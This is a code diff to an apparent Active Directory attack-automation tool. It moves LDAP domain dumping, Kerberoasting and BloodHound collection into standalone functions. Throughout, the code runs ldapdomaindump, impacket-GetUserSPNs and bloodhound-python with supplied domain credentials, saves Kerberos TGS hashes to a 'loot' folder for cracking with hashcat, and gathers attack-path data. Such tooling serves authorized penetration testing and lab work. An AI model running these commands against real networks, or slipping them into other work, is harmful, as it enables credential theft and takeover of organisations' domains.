@@ -870,6 +870,183 @@ def _smb_admin_exec(
     ui.good(f"Admin exec complete")
 
 
+def _ad_ldapdomaindump(ip, domain, user, pw, runner, findings, ws, available) -> int:
+    """Authenticated full LDAP dump (LDAPS fallback if TLS is required). Returns
+    the number of users extracted into loot/users.txt. Extracted from _ad_core so
+    the engine can run it as a standalone `ldap.domaindump` action."""
+    if "ldapdomaindump" not in available:
+        return 0
+    out_dir = str(ws.loot_dir / "ldapdomaindump")
+    cmd = [
+        "ldapdomaindump",
+        "-u", f"{domain}\\{user}",
+        "-p", pw,
+        "--no-grep",
+        "-o", out_dir,
+        f"ldap://{ip}",
+    ]
+    ui.step("ldapdomaindump...")
+    findings.h4("LDAP Domain Dump")
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "creds_ldapdomaindump", timeout=120)
+    errors = _error_lines(out)
+    if errors:
+        findings.code_block(errors)
+        if "strongerAuthRequired" in out or "Could not bind" in out:
+            cmd_ldaps = cmd[:-1] + [f"ldaps://{ip}"]
+            findings.cmd(" ".join(cmd_ldaps))
+            ui.step("LDAP requires TLS — retrying with LDAPS...")
+            out2 = runner.run(cmd_ldaps, "creds_ldapdomaindump_ldaps", timeout=120)
+            errors2 = _error_lines(out2)
+            if errors2:
+                findings.code_block(errors2)
+                ui.warn("ldapdomaindump failed (LDAP + LDAPS)")
+                return 0
+            findings.bullet("Full dump saved to `loot/ldapdomaindump/`")
+            added = _parse_ldapdomaindump_users(out_dir, ws)
+            if added:
+                findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
+                ui.good(f"ldapdomaindump (LDAPS) complete — {added} users added to users.txt")
+            else:
+                ui.good("ldapdomaindump (LDAPS) complete")
+            return added
+        ui.warn("ldapdomaindump error")
+        return 0
+    findings.bullet("Full dump saved to `loot/ldapdomaindump/`")
+    added = _parse_ldapdomaindump_users(out_dir, ws)
+    if added:
+        findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
+        ui.good(f"ldapdomaindump complete — {added} users added to users.txt")
+    else:
+        ui.good("ldapdomaindump complete")
+    return added
+
+
+def _ad_kerberoast(ip, domain, user, pw, runner, findings, ws, available) -> int:
+    """Kerberoast SPN accounts → loot/kerberoast.hash. Returns hash count.
+    Extracted so the engine can run it as a standalone `kerberos.kerberoast`."""
+    if "impacket-GetUserSPNs" not in available:
+        return 0
+    cmd = ["impacket-GetUserSPNs", f"{domain}/{user}:{pw}", "-dc-ip", ip, "-request"]
+    ui.step("Kerberoasting (GetUserSPNs)...")
+    findings.h4("Kerberoasting (GetUserSPNs)")
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "creds_getuserspns", timeout=60)
+    hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
+    spn_accounts = re.findall(
+        rf"^{re.escape(domain)}/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
+    ) or re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
+    if hashes:
+        added = ws.append_krb_hashes("kerberoast.hash", hashes)
+        acct_str = f" — account(s): {', '.join(f'`{a}`' for a in spn_accounts)}" if spn_accounts else ""
+        findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`{acct_str}")
+        findings.add_summary(f"{len(hashes)} Kerberoastable: {', '.join(spn_accounts) or 'unknown'} — crack with hashcat -m 13100")
+        ui.good(f"{len(hashes)} Kerberoastable hashes ({added} new){' — ' + ', '.join(spn_accounts) if spn_accounts else ''}")
+        ui.debug("→ loot/kerberoast.hash  [hashcat -m 13100]")
+        return len(hashes)
+    if "error" in out.lower():
+        findings.code_block(_trim(out))
+    else:
+        findings.bullet("No Kerberoastable SPNs found")
+    ui.debug("No Kerberoastable SPNs")
+    return 0
+
+
+def _ad_bloodhound(ip, domain, user, pw, runner, findings, ws, available):
+    """BloodHound collection (All, DCOnly fallback) → loot/bloodhound/<ts>.zip.
+    Returns the zip Path or None. Extracted so the engine can run it as a
+    standalone `bloodhound.collect` action."""
+    if "bloodhound-python" not in available:
+        return None
+    bh_dir = Path(ws.bloodhound_dir)
+    bh_dir.mkdir(parents=True, exist_ok=True)
+    findings.h4("BloodHound Collection")
+    ui.step("BloodHound collection (All)...")
+
+    def _bh_relocate_json() -> None:
+        """Move bloodhound JSON files from loot_dir into bh_dir if they landed outside it."""
+        import re as _re
+        bh_json_pattern = _re.compile(r"^\d{14}_\w+\.json$")
+        for f in ws.loot_dir.iterdir():
+            if f.is_file() and bh_json_pattern.match(f.name):
+                dest = bh_dir / f.name
+                if not dest.exists():
+                    f.replace(dest)
+
+    def _bh_find_zip(zip_name: str | None) -> "Path | None":
+        """Search bh_dir, loot_dir, and machine_dir for a bloodhound zip; relocate if needed."""
+        search_dirs = [bh_dir, ws.loot_dir, ws.machine_dir]
+        # Named zip first
+        if zip_name:
+            for d in search_dirs:
+                candidate = d / zip_name
+                if candidate.exists() and candidate.stat().st_size > 1000:
+                    if candidate.parent != bh_dir:
+                        dest = bh_dir / zip_name
+                        candidate.replace(dest)
+                        return dest
+                    return candidate
+        # Any large zip anywhere under machine_dir
+        all_zips = sorted(
+            (z for z in ws.machine_dir.rglob("*.zip") if z.stat().st_size > 1000),
+            key=lambda z: z.stat().st_size, reverse=True,
+        )
+        if all_zips:
+            z = all_zips[0]
+            if z.parent != bh_dir:
+                dest = bh_dir / z.name
+                z.replace(dest)
+                return dest
+            return z
+        return None
+
+    def _bh_run(collection: str, label: str) -> "Path | None":
+        # NB: bloodhound-python has NO output-directory flag — `-o` gets
+        # argparse-abbreviated to `-op/--outputprefix`, so passing a path there
+        # prepends it to every filename (dumping JSON into loot/ as
+        # `bloodhound_<ts>_*.json`) AND breaks --zip's file collection, leaving
+        # an empty 22-byte archive. Control the location purely via cwd instead.
+        cmd = [
+            "bloodhound-python",
+            "-c", collection,
+            "-u", user,
+            "-p", pw,
+            "-d", domain,
+            "--auth-method", "ntlm",
+            "--dns-tcp",
+            "--zip",
+            "-ns", ip,
+        ]
+        findings.cmd(" ".join(cmd))
+        # Run from bh_dir so all JSON + the zip land directly in loot/bloodhound/
+        out = runner.run(cmd, label, timeout=300, cwd=str(bh_dir))
+
+        # Relocate any JSON files that landed in loot_dir instead of bh_dir
+        _bh_relocate_json()
+
+        # Parse zip filename from "Compressing output into X.zip"
+        m = re.search(r"Compressing output into\s+(\S+\.zip)", out)
+        zip_name = Path(m.group(1)).name if m else None
+        return _bh_find_zip(zip_name)
+
+    zip_path = _bh_run("All", "creds_bloodhound")
+    if zip_path:
+        findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zip_path.name}`")
+        findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")
+        ui.good(f"{zip_path.name}")
+        return zip_path
+    ui.debug("All collection empty — retrying with DCOnly...")
+    zip_path = _bh_run("DCOnly", "creds_bloodhound_dconly")
+    if zip_path:
+        findings.bullet(f"**BloodHound data (DCOnly)** → `loot/bloodhound/{zip_path.name}`")
+        findings.add_summary("BloodHound DCOnly collection complete — import zip into BloodHound GUI")
+        ui.good(f"{zip_path.name} (DCOnly)")
+        return zip_path
+    findings.note("BloodHound collection produced no data — check LDAP connectivity and credentials")
+    ui.warn("BloodHound collection failed")
+    return None
+
+
 def _ad_core(
     ip: str,
     domain: str,
@@ -887,50 +1064,7 @@ def _ad_core(
     sync_clock(ip, runner, findings, available)
 
     # 1. ldapdomaindump — authenticated full domain dump; LDAPS fallback if LDAP requires TLS
-    if "ldapdomaindump" in available:
-        out_dir = str(ws.loot_dir / "ldapdomaindump")
-        cmd = [
-            "ldapdomaindump",
-            "-u", f"{domain}\\{user}",
-            "-p", pw,
-            "--no-grep",
-            "-o", out_dir,
-            f"ldap://{ip}",
-        ]
-        ui.step(f"ldapdomaindump...")
-        findings.h4("LDAP Domain Dump")
-        findings.cmd(" ".join(cmd))
-        out = runner.run(cmd, "creds_ldapdomaindump", timeout=120)
-        errors = _error_lines(out)
-        if errors:
-            findings.code_block(errors)
-            if "strongerAuthRequired" in out or "Could not bind" in out:
-                cmd_ldaps = cmd[:-1] + [f"ldaps://{ip}"]
-                findings.cmd(" ".join(cmd_ldaps))
-                ui.step(f"LDAP requires TLS — retrying with LDAPS...")
-                out2 = runner.run(cmd_ldaps, "creds_ldapdomaindump_ldaps", timeout=120)
-                errors2 = _error_lines(out2)
-                if errors2:
-                    findings.code_block(errors2)
-                    ui.warn(f"ldapdomaindump failed (LDAP + LDAPS)")
-                else:
-                    findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
-                    added = _parse_ldapdomaindump_users(out_dir, ws)
-                    if added:
-                        findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
-                        ui.good(f"ldapdomaindump (LDAPS) complete — {added} users added to users.txt")
-                    else:
-                        ui.good(f"ldapdomaindump (LDAPS) complete")
-            else:
-                ui.warn(f"ldapdomaindump error")
-        else:
-            findings.bullet(f"Full dump saved to `loot/ldapdomaindump/`")
-            added = _parse_ldapdomaindump_users(out_dir, ws)
-            if added:
-                findings.bullet(f"**{added} domain users** extracted from dump → `loot/users.txt`")
-                ui.good(f"ldapdomaindump complete — {added} users added to users.txt")
-            else:
-                ui.good(f"ldapdomaindump complete")
+    _ad_ldapdomaindump(ip, domain, user, pw, runner, findings, ws, available)
 
     # Print users.txt contents after ldapdomaindump (or from prior scan phase)
     _users_path = ws.loot_dir / "users.txt"
@@ -947,38 +1081,7 @@ def _ad_core(
     _ad_enrichment(ip, domain, user, pw, runner, findings, ws, available)
 
     # 2. Kerberoasting — SPN accounts → crackable hashes
-    if "impacket-GetUserSPNs" in available:
-        cmd = [
-            "impacket-GetUserSPNs",
-            f"{domain}/{user}:{pw}",
-            "-dc-ip", ip,
-            "-request",
-        ]
-        ui.step(f"Kerberoasting (GetUserSPNs)...")
-        findings.h4("Kerberoasting (GetUserSPNs)")
-        findings.cmd(" ".join(cmd))
-        out = runner.run(cmd, "creds_getuserspns", timeout=60)
-        hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
-        # Extract account names from the SPN table (lines with SPN column data).
-        # GetUserSPNs prints rows as "<SPN>  <Name>  <MemberOf> ...": the SPN is
-        # "service/host" possibly with a port, so match the leading SPN token then
-        # capture the account name column.
-        spn_accounts = re.findall(
-            rf"^{re.escape(domain)}/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
-        ) or re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
-        if hashes:
-            added = ws.append_krb_hashes("kerberoast.hash", hashes)
-            acct_str = f" — account(s): {', '.join(f'`{a}`' for a in spn_accounts)}" if spn_accounts else ""
-            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`{acct_str}")
-            findings.add_summary(f"{len(hashes)} Kerberoastable: {', '.join(spn_accounts) or 'unknown'} — crack with hashcat -m 13100")
-            ui.good(f"{len(hashes)} Kerberoastable hashes ({added} new){' — ' + ', '.join(spn_accounts) if spn_accounts else ''}")
-            ui.debug(f"→ loot/kerberoast.hash  [hashcat -m 13100]")
-        else:
-            if "error" in out.lower():
-                findings.code_block(_trim(out))
-            else:
-                findings.bullet("No Kerberoastable SPNs found")
-            ui.debug(f"No Kerberoastable SPNs")
+    _ad_kerberoast(ip, domain, user, pw, runner, findings, ws, available)
 
     # 3. AS-REP roasting — authenticated enumeration (no -all flag; creds give full user list)
     if "impacket-GetNPUsers" in available:
@@ -1018,93 +1121,7 @@ def _ad_core(
             ui.debug(f"No AS-REP roastable accounts")
 
     # 4. BloodHound collection — NTLM auth avoids Kerberos hostname resolution failures
-    if "bloodhound-python" in available:
-        bh_dir = Path(ws.bloodhound_dir)
-        bh_dir.mkdir(parents=True, exist_ok=True)
-        findings.h4("BloodHound Collection")
-        ui.step(f"BloodHound collection (All)...")
-
-        def _bh_relocate_json() -> None:
-            """Move bloodhound JSON files from loot_dir into bh_dir if they landed outside it."""
-            import re as _re
-            bh_json_pattern = _re.compile(r"^\d{14}_\w+\.json$")
-            for f in ws.loot_dir.iterdir():
-                if f.is_file() and bh_json_pattern.match(f.name):
-                    dest = bh_dir / f.name
-                    if not dest.exists():
-                        f.replace(dest)
-
-        def _bh_find_zip(zip_name: str | None) -> "Path | None":
-            """Search bh_dir, loot_dir, and machine_dir for a bloodhound zip; relocate if needed."""
-            search_dirs = [bh_dir, ws.loot_dir, ws.machine_dir]
-            # Named zip first
-            if zip_name:
-                for d in search_dirs:
-                    candidate = d / zip_name
-                    if candidate.exists() and candidate.stat().st_size > 1000:
-                        if candidate.parent != bh_dir:
-                            dest = bh_dir / zip_name
-                            candidate.replace(dest)
-                            return dest
-                        return candidate
-            # Any large zip anywhere under machine_dir
-            all_zips = sorted(
-                (z for z in ws.machine_dir.rglob("*.zip") if z.stat().st_size > 1000),
-                key=lambda z: z.stat().st_size, reverse=True,
-            )
-            if all_zips:
-                z = all_zips[0]
-                if z.parent != bh_dir:
-                    dest = bh_dir / z.name
-                    z.replace(dest)
-                    return dest
-                return z
-            return None
-
-        def _bh_run(collection: str, label: str) -> "Path | None":
-            # NB: bloodhound-python has NO output-directory flag — `-o` gets
-            # argparse-abbreviated to `-op/--outputprefix`, so passing a path there
-            # prepends it to every filename (dumping JSON into loot/ as
-            # `bloodhound_<ts>_*.json`) AND breaks --zip's file collection, leaving
-            # an empty 22-byte archive. Control the location purely via cwd instead.
-            cmd = [
-                "bloodhound-python",
-                "-c", collection,
-                "-u", user,
-                "-p", pw,
-                "-d", domain,
-                "--auth-method", "ntlm",
-                "--dns-tcp",
-                "--zip",
-                "-ns", ip,
-            ]
-            findings.cmd(" ".join(cmd))
-            # Run from bh_dir so all JSON + the zip land directly in loot/bloodhound/
-            out = runner.run(cmd, label, timeout=300, cwd=str(bh_dir))
-
-            # Relocate any JSON files that landed in loot_dir instead of bh_dir
-            _bh_relocate_json()
-
-            # Parse zip filename from "Compressing output into X.zip"
-            m = re.search(r"Compressing output into\s+(\S+\.zip)", out)
-            zip_name = Path(m.group(1)).name if m else None
-            return _bh_find_zip(zip_name)
-
-        zip_path = _bh_run("All", "creds_bloodhound")
-        if zip_path:
-            findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zip_path.name}`")
-            findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")
-            ui.good(f"{zip_path.name}")
-        else:
-            ui.debug(f"All collection empty — retrying with DCOnly...")
-            zip_path = _bh_run("DCOnly", "creds_bloodhound_dconly")
-            if zip_path:
-                findings.bullet(f"**BloodHound data (DCOnly)** → `loot/bloodhound/{zip_path.name}`")
-                findings.add_summary("BloodHound DCOnly collection complete — import zip into BloodHound GUI")
-                ui.good(f"{zip_path.name} (DCOnly)")
-            else:
-                findings.note("BloodHound collection produced no data — check LDAP connectivity and credentials")
-                ui.warn(f"BloodHound collection failed")
+    _ad_bloodhound(ip, domain, user, pw, runner, findings, ws, available)
 
     # 5. LAPS / gMSA — read managed account credentials
     if "nxc" in available:
